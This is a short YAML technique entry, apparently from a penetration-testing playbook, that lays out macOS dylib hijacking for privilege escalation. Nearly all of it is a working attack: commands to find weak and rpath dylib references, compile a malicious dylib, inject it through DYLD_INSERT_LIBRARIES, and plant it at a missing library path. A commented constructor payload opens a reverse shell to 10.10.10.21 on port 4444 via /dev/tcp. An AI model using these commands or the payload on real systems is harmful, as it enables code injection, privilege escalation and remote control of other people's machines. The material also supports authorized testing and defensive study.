---
description: |
  Exploit dylib hijacking on macOS by identifying weak dylib references, injecting malicious dylibs via DYLD_INSERT_LIBRARIES, or placing dylibs in rpath search paths.
commands:
  - have: Shell
    cmd: |
      # Enumeration
      otool -L /path/to/binary | grep -i weak
      otool -l /path/to/binary | grep -A2 LC_RPATH
      codesign -dvv /path/to/binary 2>&1 | grep -iE "restrict|runtime"

      # Create malicious dylib
      # __attribute__((constructor)) void init() { system("bash -i >& /dev/tcp/10.10.10.21/4444 0>&1"); }
      gcc -dynamiclib -o /tmp/evil.dylib evil.c

      # DYLD_INSERT_LIBRARIES injection (no hardened runtime)
      DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /path/to/vulnerable_binary

      # Weak/rpath dylib hijack — place at missing path found via otool
      cp /tmp/evil.dylib "/opt/missing/lib.dylib"
phase:
  - PrivEsc
target_os:
  - macOS
services: []
techniques:
  - Dylib_Hijack
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-dyld-hijacking-and-dyld_insert_libraries
---
